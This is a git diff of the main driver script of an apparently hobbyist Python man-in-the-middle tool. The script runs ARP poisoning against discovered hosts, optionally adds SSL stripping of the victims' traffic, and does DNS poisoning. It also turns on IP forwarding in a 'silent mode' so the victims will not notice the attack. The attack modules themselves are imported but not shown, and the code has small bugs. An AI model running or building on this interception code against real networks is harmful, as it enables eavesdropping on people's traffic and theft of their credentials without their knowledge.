@@ -1,12 +1,7 @@
-import multiprocessing
-import arp
-import DNSspoof
-import ssl
-import scan
-import parser
+import multiprocessing, os, sys, threading
+import arp, dns, ssl, scan, parser
 from urllib.parse import urlparse
-import os
-import sys
+from time import sleep
 
 sslRequested = False
 
@@ -97,77 +92,113 @@ def yes_no():
 
     return answr
 
+try:
+    #if not args.help
+    interface, hosts = discover()
+    args = parser.import_args()
 
-interface, hosts = discover()
-args = parser.import_args()
+    if args.ARP:
+        interval = args.ARP
+        spacing()
 
-if args.ARP:
-    interval = args.ARP
-    spacing()
+        # some threads around here i guess
 
-    # some threads around here i guess
+        print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
+        answr = yes_no()
 
-    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
-    answr = yes_no()
+        if answr is 0:
+            sslRequested = True
+            print("SSL Strip will be done")
+        else:
+            sslRequested = False
+            print("No SSL strip.")
 
-    if answr is 0:
-        sslRequested = True
-        print("SSL Strip will be done")
-    else:
-        sslRequested = False
-        print("No SSL strip.")
+        spacing()
 
-    spacing()
+        # if silent
 
-    # if silent
+        if args.silent:
+            print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
+            os.system("sysctl -w net.ipv4.ip_forward=1")
+        else:
+            print("Silent mode off. The victims might notice the attack and take measures against it.")
+            os.system("sysctl -w net.ipv4.ip_forward=0")
 
-    if args.silent:
-        print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
-        os.system("sysctl -w net.ipv4.ip_forward=1")
-    else:
-        print("Silent mode off. The victims might notice the attack and take measures against it.")
-        os.system("sysctl -w net.ipv4.ip_forward=0")
+        spacing()
 
-    spacing()
+        print("Begin ARP poisoning")
 
-    print("Begin ARP poisoning")
+        spacing()
 
-    spacing()
+        # arpAttack = arp.Poison(interface, hosts, interval)
+        # try:
+        #     arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
+        #     arpProcess.start()
+        # except KeyboardInterrupt:
+        #     print("Stopping the arp process.")
 
-    arpAttack = arp.Poison(interface, hosts, interval)
-    arpProcess = multiprocessing.Process(
-        target=arpAttack.poison, name="ARP Poison")
-    arpProcess.start()
+        # #sleep(5)
 
-    if sslRequested == True:
-        ssl = ssl.SSLStrip()
-        sslProcess = multiprocessing.Process(
-            target=ssl.strip, name="SSL Strip")
+        # if sslRequested == True:
+        #     ssl = ssl.SSLStrip()
+        #     try:
+        #         sslProcess = multiprocessing.Process(
+        #             target=ssl.strip, name="SSL Strip")
+        #         sslProcess.start()
+        #     except KeyboardInterrupt:
+        #         print("Stopping the arp process.")
 
-elif args.DNS:
-    websites = args.DNS
 
-    arpAttack = arp.Poison(interface, hosts, 5)
-    arpProcess = multiprocessing.Process(
-        target=arpAttack.poison, name="ARP Poison")
-    arpProcess.start()
+        arp = arp.Poison(interface, hosts, interval)
+        try:
+            arpThread = threading.Thread(target=arp.poison, name="ARP Poison")
+            arpThread.start()
+        except KeyboardInterrupt:
+            arpThread.join()
 
-    # dnsobject = DNSspoof.DNSPoison()
-    # packet = dnsobject.sniff()
-    # dnsAttack = DNSspoof.DNSPoison()
-    # dnsProcess = multiprocessing.Process(target=dnsAttack.dns_reply(packet), name="DNS Poison")
-    # dnsProcess.start()
-    # no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
-    # for url in websites:
-    #     no_issue = no_issue and is_valid_link(url)
+        sleep(5)
 
-    # if no_issue:
-    #     # HERE YOU CALL DNS POISONING FUNCTION
-    #     print(websites)
-    # else:
-    #     print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
-    #     print("------------------------------------------------------------------\n")
-    #     for url in websites:
-    #         if not is_valid_link(url):
-    #             print(
-    #                 "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
+        if sslRequested == True:
+            ssl = ssl.SSLStrip()
+            try:
+                sslThread = threading.Thread(target=ssl.strip, name="SSL Strip")
+                sslThread.start()
+            except KeyboardInterrupt:
+                sslThread.join()
+
+    elif args.DNS:
+        websites = args.DNS
+
+        arpAttack = arp.Poison(interface, hosts, 5)
+        try:
+            arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
+            arpProcess.start()
+        except KeyboardInterrupt:
+            print("Stopping the arp process.")
+
+        dns = dns.Poison()
+        packet = dns.sniff()
+        try:
+            dnsProcess = multiprocessing.Process(target=dns.reply, args=packet, name="DNS Poison")
+            dnsProcess.start()
+        except KeyboardInterrupt:
+            print("Stopping the dns process.")
+
+        # no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
+        # for url in websites:
+        #     no_issue = no_issue and is_valid_link(url)
+
+        # if no_issue:
+        #     # HERE YOU CALL DNS POISONING FUNCTION
+        #     print(websites)
+        # else:
+        #     print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
+        #     print("------------------------------------------------------------------\n")
+        #     for url in websites:
+        #         if not is_valid_link(url):
+        #             print(
+        #                 "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
+except KeyboardInterrupt:
+    arpThread.terminate()
+    sslThread.terminate()
+    print("Stopping the tool.")
